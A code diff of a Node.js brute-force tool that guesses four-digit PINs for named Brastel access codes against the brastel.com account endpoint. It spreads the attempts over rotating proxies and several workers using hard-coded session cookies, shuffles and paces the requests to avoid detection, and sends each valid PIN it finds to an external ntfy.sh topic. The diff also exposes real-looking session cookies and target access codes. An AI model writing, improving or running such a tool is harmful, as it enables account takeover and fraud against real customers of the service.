@@ -45,96 +45,225 @@ const FILE_NAMES = {
 };
 
 /**
- * Configuration object containing all settings
+ * Configuration Loader - Load config from text files
  */
-const CONFIG = {
-  // Multiple accessCodes configuration
-  accessCodes: [
-    {
-      accessCode: '74974423',
-      pinRange: {
-        start: 5410,
-        end: 9999
-      }
-    },
-    {
-      accessCode: '33849108',
-      pinRange: {
-        start: 0,
-        end: 9999
-      }
-    }
-  ],
-
-  // Worker configuration
-  concurrentWorkers: 1,
-  maxRetries: 10,
-  retryDelay: 3000,
-  proxyRotationInterval: 250000, // 250 seconds
-  requestTimeout: 60000,
-  maxUndefinedResults: 25, // Stop program if undefined results exceed this
-
-  // Random processing configuration
-  randomProcessing: {
-    enabled: true, // Set to true to enable random PIN selection (shuffle mode), false for sequential
-    delayBetweenPins: 100 // Delay in ms between PIN processing
-  },
-
-  // Folder paths
-  folders: {
-    logs: 'Log',
-    data: 'Data'
-  },
-
-  // File paths for tracking (will be dynamically generated based on accessCode)
-  getFilePaths(accessCode) {
-    const accessCodeFolder = path.join(this.folders.data, accessCode);
-    return {
-      folder: accessCodeFolder,
-      sentPins: path.join(accessCodeFolder, FILE_NAMES.SENT_PINS),
-      blacklistPins: path.join(accessCodeFolder, FILE_NAMES.BLACKLIST_PINS),
-      validPins: path.join(accessCodeFolder, FILE_NAMES.VALID_PINS)
+class ConfigLoader {
+  constructor() {
+    this.configFiles = {
+      pinRange: 'pinrange.txt',
+      accessCodes: 'accesscodes.txt',
+      proxies: 'proxies.txt',
+      cookies: 'cookies.txt'
     };
-  },
-
-  // API endpoints and headers
-  api: {
-    url: 'https://www.brastel.com/web/WIMS/Manager.aspx',
-    headers: {
-      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-      'Accept': 'application/json, text/javascript, */*; q=0.01',
-      'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
-      'X-Requested-With': 'XMLHttpRequest',
-      'Referer': 'https://www.brastel.com/myaccount/m/password/eng',
-      'Origin': 'https://www.brastel.com',
-      'Accept-Encoding': 'gzip, deflate, br, zstd',
-      'Accept-Language': 'en-US,en;q=0.9',
-      'Connection': 'keep-alive'
-    }
-  },
-
-  // Static proxy list
-  proxies: [
-    '',
-    '',
-    ''
-  ],
-
-  // Cookie configurations
-  cookies: [
-    '_ga=GA1.2.2004863075.1749788627; ASP.NET_SessionId=kkmvt2y4ni0d4bp1sg0vz3xf; AWSELB=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9F2459D1D823108D586FB065E7B5F9002AD22EB5161F2C7AB3014A70051CE4FA39D6AA5C0E88A842A861D33DC4EA44715; AWSELBCORS=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9F2459D1D823108D586FB065E7B5F9002AD22EB5161F2C7AB3014A70051CE4FA39D6AA5C0E88A842A861D33DC4EA44715; _gid=GA1.2.756149190.1750037918; ASPSESSIONIDCQDCDADQ=EMMPDBIDOPDCKJKJCDCMKLBJ; _gat=1',
-    'ASPSESSIONIDCQDCDADQ=FMMPDBIDMJCOKDIBPHJPDCOP; AWSELB=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9630A4EB55147521A4CC93077CC30C2F8ED0CDD21FDE9E146F00EB73527DB00B97FD4E580278805751D3836308F6F276B; AWSELBCORS=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9630A4EB55147521A4CC93077CC30C2F8ED0CDD21FDE9E146F00EB73527DB00B97FD4E580278805751D3836308F6F276B; ASP.NET_SessionId=jdjtcrz3ldwqknn0la2hglta; _ga=GA1.2.1880294636.1750065908; _gid=GA1.2.166709486.1750065908; _gat=1',
-    'ASPSESSIONIDCQDCDADQ=FMMPDBIDMJCOKDIBPHJPDCOP; AWSELB=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9630A4EB55147521A4CC93077CC30C2F8ED0CDD21FDE9E146F00EB73527DB00B97FD4E580278805751D3836308F6F276B; AWSELBCORS=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9630A4EB55147521A4CC93077CC30C2F8ED0CDD21FDE9E146F00EB73527DB00B97FD4E580278805751D3836308F6F276B; ASP.NET_SessionId=jdjtcrz3ldwqknn0la2hglta; _ga=GA1.2.1880294636.1750065908; _gid=GA1.2.166709486.1750065908; _gat=1; signInLangTrackEvent=50250189300514'
-  ],
-
-  // Ntfy notification configuration
-  ntfy: {
-    enabled: true, // Set to false to disable ntfy notifications
-    server: 'https://ntfy.sh', // Ntfy server URL
-    topic: 'dhloc', // Topic to send notifications to
-    priority: '5' // Default priority (1-5, 5 is highest)
   }
-};
+
+  /**
+   * Load configuration from files
+   */
+  loadConfig() {
+    const config = {
+      // Default configuration
+      maxRetries: 10,
+      retryDelay: 3000,
+      requestTimeout: 60000,
+      maxUndefinedResults: 25,
+
+      // Random processing configuration
+      randomProcessing: {
+        enabled: true,
+        delayBetweenPins: 100
+      },
+
+      // Folder paths
+      folders: {
+        logs: 'Log',
+        data: 'Data'
+      },
+
+      // File paths for tracking (will be dynamically generated based on accessCode)
+      getFilePaths(accessCode) {
+        const accessCodeFolder = path.join(this.folders.data, accessCode);
+        return {
+          folder: accessCodeFolder,
+          sentPins: path.join(accessCodeFolder, FILE_NAMES.SENT_PINS),
+          blacklistPins: path.join(accessCodeFolder, FILE_NAMES.BLACKLIST_PINS),
+          validPins: path.join(accessCodeFolder, FILE_NAMES.VALID_PINS)
+        };
+      },
+
+      // API endpoints and headers
+      api: {
+        url: 'https://www.brastel.com/web/WIMS/Manager.aspx',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+          'Accept': 'application/json, text/javascript, */*; q=0.01',
+          'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
+          'X-Requested-With': 'XMLHttpRequest',
+          'Referer': 'https://www.brastel.com/myaccount/m/password/eng',
+          'Origin': 'https://www.brastel.com',
+          'Accept-Encoding': 'gzip, deflate, br, zstd',
+          'Accept-Language': 'en-US,en;q=0.9',
+          'Connection': 'keep-alive'
+        }
+      },
+
+      // Ntfy notification configuration
+      ntfy: {
+        enabled: true,
+        server: 'https://ntfy.sh',
+        topic: 'dhloc',
+        priority: '5'
+      }
+    };
+
+    // Load PIN range
+    const pinRange = this.loadPinRange();
+
+    // Load access codes
+    const accessCodes = this.loadAccessCodes(pinRange);
+
+    // Load proxies and cookies
+    const proxies = this.loadProxies();
+    const cookies = this.loadCookies();
+
+    // Set concurrent workers based on cookies count
+    const concurrentWorkers = cookies.length;
+
+    // Assign loaded values
+    config.pinRange = pinRange;
+    config.accessCodes = accessCodes;
+    config.proxies = proxies;
+    config.cookies = cookies;
+    config.concurrentWorkers = concurrentWorkers;
+
+    console.log(`✅ Loaded config: ${accessCodes.length} access codes, ${cookies.length} cookies, ${proxies.length} proxies`);
+    console.log(`⚙️  Concurrent workers set to: ${concurrentWorkers} (based on cookies count)`);
+
+    return config;
+  }
+
+  /**
+   * Load PIN range from file
+   */
+  loadPinRange() {
+    try {
+      if (!fsSync.existsSync(this.configFiles.pinRange)) {
+        console.log(`⚠️  ${this.configFiles.pinRange} not found, using default range 0-9999`);
+        return { start: 0, end: 9999 };
+      }
+
+      const data = fsSync.readFileSync(this.configFiles.pinRange, 'utf8').trim().split('\n');
+      const start = parseInt(data[0]) || 0;
+      const end = parseInt(data[1]) || 9999;
+
+      console.log(`📊 PIN Range: ${start} - ${end}`);
+      return { start, end };
+    } catch (error) {
+      console.log(`❌ Error loading ${this.configFiles.pinRange}: ${error.message}`);
+      return { start: 0, end: 9999 };
+    }
+  }
+
+  /**
+   * Load access codes from file
+   */
+  loadAccessCodes(pinRange) {
+    try {
+      if (!fsSync.existsSync(this.configFiles.accessCodes)) {
+        console.log(`⚠️  ${this.configFiles.accessCodes} not found, using default access codes`);
+        return [
+          { accessCode: '74974423', pinRange },
+          { accessCode: '33849108', pinRange }
+        ];
+      }
+
+      const data = fsSync.readFileSync(this.configFiles.accessCodes, 'utf8')
+        .trim()
+        .split('\n')
+        .map(line => line.trim())
+        .filter(line => line.length > 0);
+
+      const accessCodes = data.map(accessCode => ({
+        accessCode,
+        pinRange: { ...pinRange }
+      }));
+
+      console.log(`🎯 Access Codes: ${accessCodes.map(ac => ac.accessCode).join(', ')}`);
+      return accessCodes;
+    } catch (error) {
+      console.log(`❌ Error loading ${this.configFiles.accessCodes}: ${error.message}`);
+      return [
+        { accessCode: '74974423', pinRange },
+        { accessCode: '33849108', pinRange }
+      ];
+    }
+  }
+
+  /**
+   * Load proxies from file
+   */
+  loadProxies() {
+    try {
+      if (!fsSync.existsSync(this.configFiles.proxies)) {
+        console.log(`⚠️  ${this.configFiles.proxies} not found, using no proxy`);
+        return [''];
+      }
+
+      const data = fsSync.readFileSync(this.configFiles.proxies, 'utf8')
+        .trim()
+        .split('\n')
+        .map(line => line.trim());
+
+      // If file is empty or only has empty lines, use no proxy
+      if (data.length === 0 || data.every(line => line === '')) {
+        console.log('🛡️  Proxies: No proxy configured');
+        return [''];
+      }
+
+      console.log(`🛡️  Proxies: ${data.length} proxy(ies) loaded`);
+      return data;
+    } catch (error) {
+      console.log(`❌ Error loading ${this.configFiles.proxies}: ${error.message}`);
+      return [''];
+    }
+  }
+
+  /**
+   * Load cookies from file
+   */
+  loadCookies() {
+    try {
+      if (!fsSync.existsSync(this.configFiles.cookies)) {
+        console.log(`⚠️  ${this.configFiles.cookies} not found, using default cookies`);
+        return [
+          '_ga=GA1.2.2004863075.1749788627; ASP.NET_SessionId=kkmvt2y4ni0d4bp1sg0vz3xf; AWSELB=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9F2459D1D823108D586FB065E7B5F9002AD22EB5161F2C7AB3014A70051CE4FA39D6AA5C0E88A842A861D33DC4EA44715; AWSELBCORS=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9F2459D1D823108D586FB065E7B5F9002AD22EB5161F2C7AB3014A70051CE4FA39D6AA5C0E88A842A861D33DC4EA44715; _gid=GA1.2.756149190.1750037918; ASPSESSIONIDCQDCDADQ=EMMPDBIDOPDCKJKJCDCMKLBJ; _gat=1'
+        ];
+      }
+
+      const data = fsSync.readFileSync(this.configFiles.cookies, 'utf8')
+        .trim()
+        .split('\n')
+        .map(line => line.trim())
+        .filter(line => line.length > 0);
+
+      if (data.length === 0) {
+        throw new Error('No cookies found in file');
+      }
+
+      console.log(`🍪 Cookies: ${data.length} cookie(s) loaded`);
+      return data;
+    } catch (error) {
+      console.log(`❌ Error loading ${this.configFiles.cookies}: ${error.message}`);
+      return [
+        '_ga=GA1.2.2004863075.1749788627; ASP.NET_SessionId=kkmvt2y4ni0d4bp1sg0vz3xf; AWSELB=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9F2459D1D823108D586FB065E7B5F9002AD22EB5161F2C7AB3014A70051CE4FA39D6AA5C0E88A842A861D33DC4EA44715; AWSELBCORS=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9F2459D1D823108D586FB065E7B5F9002AD22EB5161F2C7AB3014A70051CE4FA39D6AA5C0E88A842A861D33DC4EA44715; _gid=GA1.2.756149190.1750037918; ASPSESSIONIDCQDCDADQ=EMMPDBIDOPDCKJKJCDCMKLBJ; _gat=1'
+      ];
+    }
+  }
+}
+
+// Initialize configuration
+const configLoader = new ConfigLoader();
+const CONFIG = configLoader.loadConfig();
 
 /**
  * Utility functions
@@ -312,7 +441,8 @@ class FileManager {
    * @returns {boolean} True if already sent
    */
   isPinSent(pin) {
-    return this.cache.get('sentPins')?.has(pin) || false;
+    const sentPins = this.cache.get('sentPins');
+    return sentPins ? sentPins.has(pin) : false;
   }
 
   /**
@@ -342,7 +472,8 @@ class FileManager {
    * @returns {boolean} True if blacklisted
    */
   isBlacklisted(pin) {
-    return this.cache.get('blacklistPins')?.has(pin) || false;
+    const blacklistPins = this.cache.get('blacklistPins');
+    return blacklistPins ? blacklistPins.has(pin) : false;
   }
 
   /**
@@ -424,9 +555,11 @@ class FileManager {
 
   getStatistics() {
     const validNonBlacklisted = this.getValidNonBlacklistedPins();
+    const sentPins = this.cache.get('sentPins');
+    const blacklistPins = this.cache.get('blacklistPins');
     return {
-      sentPinsCount: this.cache.get('sentPins')?.size || 0,
-      blacklistPinsCount: this.cache.get('blacklistPins')?.size || 0,
+      sentPinsCount: sentPins ? sentPins.size : 0,
+      blacklistPinsCount: blacklistPins ? blacklistPins.size : 0,
       validPinsCount: this.getValidPins().length,
       validNonBlacklistedCount: validNonBlacklisted.length,
       blacklistedPins: this.getBlacklistPins(),
@@ -643,14 +776,14 @@ class PinChecker {
       // Valid PIN found
       this.logger.found(`Worker ${workerId} - FOUND VALID PIN: ${pin}`);
       this.fileManager.addValidPin(pin);
-      
+
       // Send ntfy notification
       try {
         await this.ntfyNotifier.sendPinFoundNotification(this.accessCode, pin, workerId);
       } catch (error) {
         this.logger.error(`Failed to send ntfy notification: ${error.message}`);
       }
-      
+
       this.found = true;
       return true;
     }
@@ -701,12 +834,15 @@ class PinChecker {
  * Worker class for processing PINs
  */
 class Worker {
-  constructor(id, logger, proxyManager, pinChecker, fileManager) {
+  constructor(id, logger, proxyManager, pinChecker, fileManager, proxy, cookie) {
     this.id = id;
     this.logger = logger;
     this.proxyManager = proxyManager;
     this.pinChecker = pinChecker;
     this.fileManager = fileManager;
+    this.proxy = proxy;
+    this.cookie = cookie;
+    this.agent = this.proxyManager.createStaticProxy(proxy);
   }
 
   /**
@@ -720,15 +856,13 @@ class Worker {
 
   /**
    * Process a list of PINs (either sequentially or with shuffle random selection)
-   * @param {Array<number>} pins - Array of PINs to check (đã được lọc unsent)
-   * @param {string} cookie - Cookie string
-   * @param {string} staticProxy - Static proxy URL
+   * @param {Array<number>} pins - Array of PINs to check
    */
-  async process(pins, cookie, staticProxy) {
-    const agent = this.proxyManager.createStaticProxy(staticProxy);
+  async process(pins) {
     const formattedPins = this.formatPins(pins);
+    const proxyInfo = this.proxy ? `via ${this.proxy}` : 'direct connection';
 
-    this.logger.info(`Worker ${this.id} - Processing ${formattedPins.length} PINs`);
+    this.logger.info(`Worker ${this.id} - Processing ${formattedPins.length} PINs ${proxyInfo}`);
 
     if (formattedPins.length === 0) {
       this.logger.warning(`Worker ${this.id} - No PINs available to process`);
@@ -738,20 +872,18 @@ class Worker {
     // Choose processing mode based on configuration
     if (CONFIG.randomProcessing.enabled) {
       this.logger.info(`Worker ${this.id} - Using random shuffle processing mode`);
-      await this.processWithShuffle(formattedPins, agent, cookie);
+      await this.processWithShuffle(formattedPins);
     } else {
       this.logger.info(`Worker ${this.id} - Using sequential processing mode`);
-      await this.processSequentially(formattedPins, agent, cookie);
+      await this.processSequentially(formattedPins);
     }
   }
 
   /**
    * Process PINs sequentially (original method)
    * @param {Array<string>} unsentPins - Array of unsent formatted PINs
-   * @param {*} agent - Proxy agent
-   * @param {string} cookie - Cookie string
    */
-  async processSequentially(unsentPins, agent, cookie) {
+  async processSequentially(unsentPins) {
     for (let i = 0; i < unsentPins.length; i++) {
       const pin = unsentPins[i];
 
@@ -760,7 +892,7 @@ class Worker {
         return;
       }
       const progressInfo = `Progress: ${i + 1}/${unsentPins.length}`;
-      await this.pinChecker.checkPin(pin, agent, cookie, this.id, progressInfo);
+      await this.pinChecker.checkPin(pin, this.agent, this.cookie, this.id, progressInfo);
     }
     this.logger.info(`Worker ${this.id} - Completed sequential processing`);
   }
@@ -768,10 +900,8 @@ class Worker {
   /**
    * Process PINs with random shuffle selection
    * @param {Array<string>} unsentPins - Array of unsent formatted PINs
-   * @param {*} agent - Proxy agent
-   * @param {string} cookie - Cookie string
    */
-  async processWithShuffle(unsentPins, agent, cookie) {
+  async processWithShuffle(unsentPins) {
     // Shuffle the unsent pins array for random processing
     const shuffledPins = Utils.shuffleArray(unsentPins);
 
@@ -792,7 +922,7 @@ class Worker {
       }
 
       const progressInfo = `Progress: ${i + 1}/${shuffledPins.length}`;
-      await this.pinChecker.checkPin(pin, agent, cookie, this.id, progressInfo);
+      await this.pinChecker.checkPin(pin, this.agent, this.cookie, this.id, progressInfo);
     }
 
     this.logger.success(`Worker ${this.id} - Completed random shuffle processing of all ${shuffledPins.length} PINs`);
@@ -902,11 +1032,13 @@ class SingleAccessCodeChecker {
         set: (value) => { this.pinChecker.found = value; }
       });
 
-      const worker = new Worker(i + 1, this.logger, this.proxyManager, workerPinChecker, this.fileManager);
-      const cookie = CONFIG.cookies[i] || CONFIG.cookies[0]; // Fallback to first cookie
-      const staticProxy = CONFIG.proxies[i] || ''; // Fallback to unused proxy
+      // Assign fixed cookie and proxy for each worker
+      const cookie = CONFIG.cookies[i % CONFIG.cookies.length];
+      const proxy = CONFIG.proxies[i % CONFIG.proxies.length] || '';
 
-      workers.push(worker.process(pinBatches[i] || [], cookie, staticProxy));
+      const worker = new Worker(i + 1, this.logger, this.proxyManager, workerPinChecker, this.fileManager, proxy, cookie);
+
+      workers.push(worker.process(pinBatches[i] || []));
     }
 
     return workers;
@@ -1063,8 +1195,8 @@ class NtfyNotifier {
   sanitizeHeader(text) {
     // Remove emojis and special characters that might cause HTTP header issues
     return text.replace(/[\u{1F600}-\u{1F64F}]|[\u{1F300}-\u{1F5FF}]|[\u{1F680}-\u{1F6FF}]|[\u{1F1E0}-\u{1F1FF}]|[\u{2600}-\u{26FF}]|[\u{2700}-\u{27BF}]/gu, '')
-               .replace(/[^\x00-\x7F]/g, '') // Remove non-ASCII characters
-               .trim();
+      .replace(/[^\x00-\x7F]/g, '') // Remove non-ASCII characters
+      .trim();
   }
 
   /**
@@ -1082,10 +1214,10 @@ class NtfyNotifier {
 
     try {
       const url = `${this.server}/${this.topic}`;
-      
+
       // Sanitize title for HTTP header
       const sanitizedTitle = this.sanitizeHeader(title);
-      
+
       const response = await fetch(url, {
         method: 'POST',
         headers: {
@@ -1119,7 +1251,7 @@ class NtfyNotifier {
   async sendPinFoundNotification(accessCode, pin, workerId) {
     const title = 'Brastel PIN Found!'; // Removed emoji from title
     const message = `🎯 Brastel PIN Found!\n\nAccess Code: ${accessCode}\nPIN: ${pin}\nWorker: ${workerId}\nTime: ${new Date().toLocaleString()}`;
-    
+
     return await this.sendNotification(title, message, '5'); // High priority
   }
 }
